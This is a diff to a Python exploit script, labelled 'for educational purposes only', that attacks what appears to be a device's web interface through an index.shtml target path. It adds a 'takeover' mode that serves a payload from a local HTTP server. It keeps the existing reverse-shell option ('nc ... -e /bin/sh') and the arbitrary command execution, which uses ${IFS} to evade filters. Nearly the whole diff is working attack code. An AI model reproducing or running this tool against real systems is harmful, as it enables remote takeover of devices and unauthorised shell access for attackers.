@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 """
 !!! FOR EDUCATIONAL PURPOSES ONLY !!!
 
@@ -41,6 +41,7 @@ parser.add_argument("-olc", "--overlay-leak-command", type=str, help="Optional l
 # Non-overlay command arguments
 parser.add_argument("-r",   "--reverse", action="store_true", help="Request reverse shell from target (nc [LISTEN] [LISTEN_PORT] -e /bin/sh)")
 parser.add_argument("-e",   "--execute", type=str, help="Execute command (OVERRIDES --reverse)")
+parser.add_argument("--takeover", action="store_true", help="Takeover device (OVERRIDES --reverse and --execute) *requires takeover.py")
 
 # Special Connection arguments
 parser.add_argument("-f",   "--target-path", type=str, help="Target file path", default="index.shtml")
@@ -98,14 +99,18 @@ if (args.overlay_leak):
 if (args.overlay_leak_command != None):
     leak_cmd = args.overlay_leak_command
 
-if (args.execute != None):
-    exe_cmd = f"{args.execute}"
+if (args.takeover):
+    import takeover
+    exe_cmd = takeover.takeover_cmd(listen_ip, listen_port)
 else:
-    if (args.reverse):
-        exe_cmd = f"nc {listen_ip} {listen_port} -e /bin/sh"
+    if (args.execute != None):
+        exe_cmd = f"{args.execute}"
+    else:
+        if (args.reverse):
+            exe_cmd = f"nc {listen_ip} {listen_port} -e /bin/sh"
 
-if (args.execute != None and args.reverse):
-    logging(f"Reverse and Execute specified:\n\tOverriding --reverse command with --execute command.\n")
+    if (args.execute != None and args.reverse):
+        logging(f"Reverse and Execute specified:\n\tOverriding --reverse command with --execute command.\n")
 
 
 """
@@ -280,6 +285,11 @@ def overlay_leak():
 def dst_command_req():
     global stage
     
+    if (args.takeover):
+        http_start, http_stop = takeover.http_server(listen_port)
+        http_start()
+
+
     cmd_ifs = exe_cmd.replace(' ', "${IFS}")
     
     COMMAND_DATA = {
@@ -292,6 +302,12 @@ def dst_command_req():
     logging("+ Running sync to execute command\n")
     sync_req()
     dst_reset_req()
+
+    if (args.takeover):
+        sleep(60)
+        http_stop()
+
+
     stage += 1
 
 
@@ -311,7 +327,7 @@ def main():
     if (args.overlay_leak or args.overlay_leak_command):
         overlay_leak()
 
-    if (args.reverse or args.execute != None):
+    if (args.takeover or args.reverse or args.execute != None):
         if not args.quiet:
             if not args.auto:
                 input("= Start listener and press Enter to continue...")
